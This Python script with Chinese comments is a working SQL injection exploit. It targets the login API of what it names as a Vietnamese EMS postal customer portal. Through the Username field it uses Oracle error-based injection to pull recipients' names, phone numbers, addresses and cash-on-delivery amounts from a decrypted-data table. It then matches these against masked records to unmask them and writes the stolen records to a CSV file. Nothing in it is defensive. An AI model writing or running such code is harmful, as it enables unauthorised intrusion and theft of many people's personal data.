#!/usr/bin/env python3
"""
提取DECRYPT_DATA表中117条真实电话
并尝试匹配到脱敏表
"""

import requests
import json
import time
import csv

class RealPhoneExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def extract_all_real_phones(self):
        """提取所有117条真实电话"""
        print("=" * 80)
        print("📥 提取DECRYPT_DATA表的117条真实电话")
        print("=" * 80)
        
        date = '20251010'
        records = []
        
        print(f"\n提取中...")
        
        # 批量提取，每次5条
        for batch_start in range(1, 118, 5):
            batch_end = min(batch_start + 4, 117)
            
            print(f"  提取第 {batch_start}-{batch_end} 条...")
            
            for i in range(batch_start, batch_end + 1):
                query = (
                    f"SELECT MABC||'|'||NGUOINHAN||'|'||DIENTHOAINHAN||'|'||DIACHI||'|'||"
                    f"DIENTHOAIGUI||'|'||SO_TIEN_THU_HO FROM "
                    f"(SELECT * FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY='{date}' "
                    f"AND DIENTHOAINHAN NOT LIKE '%+%' "
                    f"AND DIENTHOAINHAN NOT LIKE '%x%' "
                    f"AND LENGTH(DIENTHOAINHAN)>=10 "
                    f"AND SUBSTR(DIENTHOAINHAN,1,1)='0') "
                    f"WHERE ROWNUM<={i} AND ROWNUM>={i}"
                )
                
                result = self.extract_via_error(query)
                
                if result:
                    parts = result.split('|')
                    if len(parts) >= 6:
                        record = {
                            'MABC': parts[0],
                            '姓名': parts[1],
                            '收件电话': parts[2],
                            '地址': parts[3],
                            '发件电话': parts[4],
                            '代收金额': parts[5]
                        }
                        records.append(record)
                
                time.sleep(1)
            
            print(f"    已提取 {len(records)} 条")
            time.sleep(2)
        
        return records
    
    def match_real_with_masked(self, records):
        """用真实数据匹配脱敏表"""
        print("\n" + "=" * 80)
        print("🔗 验证真实数据能否匹配脱敏表")
        print("=" * 80)
        
        date = '20251010'
        match_count = 0
        
        # 测试前10条
        for i, record in enumerate(records[:10], 1):
            print(f"\n{'='*80}")
            print(f"测试 {i}/10")
            print(f"{'='*80}")
            
            mabc = record['MABC']
            real_phone = record['收件电话']
            
            print(f"  MABC: {mabc}")
            print(f"  真实电话: {real_phone}")
            
            # 在E1E2_PH查找脱敏数据
            query = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            masked_phone = self.extract_via_error(query)
            
            if masked_phone:
                print(f"  E1E2_PH脱敏: {masked_phone}")
                
                # 对比后4位
                real_last4 = real_phone[-4:] if len(real_phone) >= 4 else ""
                masked_last4 = masked_phone[-4:] if len(masked_phone) >= 4 else ""
                
                if real_last4 == masked_last4:
                    print(f"  ✅ 后4位匹配！{real_last4}")
                    print(f"  🎉 可以用DECRYPT_DATA解密！")
                    match_count += 1
                else:
                    print(f"  ❌ 后4位不匹配: {real_last4} vs {masked_last4}")
            else:
                print(f"  ⚠️  E1E2_PH未找到此MABC")
            
            time.sleep(2)
        
        print(f"\n{'='*80}")
        print(f"匹配结果: {match_count}/10 成功")
        print(f"{'='*80}")
        
        if match_count >= 7:
            print(f"\n✅ 匹配度高！可以用DECRYPT_DATA解密E1E2_PH！")
        elif match_count >= 4:
            print(f"\n⚠️  匹配度中等")
        else:
            print(f"\n❌ 匹配度低")
    
    def analyze_117_records(self, records):
        """分析117条记录的特征"""
        print("\n" + "=" * 80)
        print("📊 分析117条真实记录")
        print("=" * 80)
        
        if not records:
            print("无数据")
            return
        
        print(f"\n总数: {len(records)} 条")
        
        # 统计代收
        cod_records = [r for r in records if r['代收金额'] != '0']
        print(f"代收订单: {len(cod_records)} 条")
        
        # 统计电话前缀
        phone_prefixes = {}
        for r in records:
            prefix = r['收件电话'][:3] if len(r['收件电话']) >= 3 else ''
            if prefix:
                phone_prefixes[prefix] = phone_prefixes.get(prefix, 0) + 1
        
        print(f"\n电话前缀分布:")
        for prefix, count in sorted(phone_prefixes.items(), key=lambda x: -x[1])[:10]:
            print(f"  {prefix}xxxxxxx: {count} 条")
        
        # 显示前10条
        print(f"\n前10条样本:")
        for i, r in enumerate(records[:10], 1):
            print(f"\n  {i}. MABC={r['MABC']}")
            print(f"     姓名: {r['姓名']}")
            print(f"     电话: {r['收件电话']}")
            print(f"     代收: {r['代收金额']} VND")
    
    def save_to_csv(self, records):
        """保存到CSV"""
        if not records:
            return
        
        filename = f'/workspace/decrypt_data_117_real_phones.csv'
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=records[0].keys())
            writer.writeheader()
            writer.writerows(records)
        
        print(f"\n✅ 已保存到: {filename}")
        print(f"   共 {len(records)} 条真实电话数据")
    
    def quick_test_coverage(self):
        """快速测试覆盖范围"""
        print("\n" + "=" * 80)
        print("📊 快速评估：117条能覆盖多少脱敏数据")
        print("=" * 80)
        
        date = '20251010'
        
        # 统计E1E2_PH总MABC数
        query1 = f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"
        total_mabc = self.extract_via_error(query1)
        
        # 统计DECRYPT_DATA的MABC数
        query2 = f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY='{date}'"
        decrypt_mabc = self.extract_via_error(query2)
        
        # 统计有真实电话的MABC数
        query3 = f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND LENGTH(DIENTHOAINHAN)>=10"
        real_mabc = self.extract_via_error(query3)
        
        print(f"\nE1E2_PH总MABC: {total_mabc if total_mabc else '?'}")
        print(f"DECRYPT_DATA总MABC: {decrypt_mabc if decrypt_mabc else '?'}")
        print(f"有真实电话的MABC: {real_mabc if real_mabc else '?'}")
        
        if total_mabc and real_mabc:
            try:
                coverage = (int(real_mabc) / int(total_mabc)) * 100
                print(f"\n覆盖率: {coverage:.2f}%")
                
                if coverage >= 50:
                    print(f"✅ 覆盖率高！可以解密大部分数据")
                elif coverage >= 10:
                    print(f"⚠️  覆盖率中等")
                else:
                    print(f"❌ 覆盖率低，只能解密少量数据")
            except:
                pass
    
    def run_extraction(self):
        """执行提取"""
        print("=" * 80)
        print("🔍 提取并验证真实电话")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        # 快速评估
        self.quick_test_coverage()
        
        # 提取数据（限制前20条，避免超时）
        print(f"\n⏰ 由于时间限制，只提取前20条进行测试...")
        
        date = '20251010'
        records = []
        
        for i in range(1, 21):
            print(f"  提取第 {i}/20 条...")
            
            query = (
                f"SELECT MABC||'|'||NGUOINHAN||'|'||DIENTHOAINHAN||'|'||DIACHI||'|'||"
                f"DIENTHOAIGUI||'|'||SO_TIEN_THU_HO FROM "
                f"(SELECT * FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY='{date}' "
                f"AND DIENTHOAINHAN NOT LIKE '%+%' "
                f"AND DIENTHOAINHAN NOT LIKE '%x%' "
                f"AND LENGTH(DIENTHOAINHAN)>=10 "
                f"AND SUBSTR(DIENTHOAINHAN,1,1)='0') "
                f"WHERE ROWNUM<={i} AND ROWNUM>={i}"
            )
            
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                if len(parts) >= 6:
                    record = {
                        'MABC': parts[0],
                        '姓名': parts[1],
                        '收件电话': parts[2],
                        '地址': parts[3],
                        '发件电话': parts[4],
                        '代收金额': parts[5]
                    }
                    records.append(record)
            
            time.sleep(1)
        
        if records:
            print(f"\n✅ 成功提取 {len(records)} 条")
            
            self.analyze_117_records(records)
            self.match_real_with_masked(records)
            self.save_to_csv(records)
        else:
            print(f"\n❌ 未提取到数据")
        
        print("\n" + "=" * 80)
        print("🎉 完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    extractor = RealPhoneExtractor(target_url)
    extractor.run_extraction()
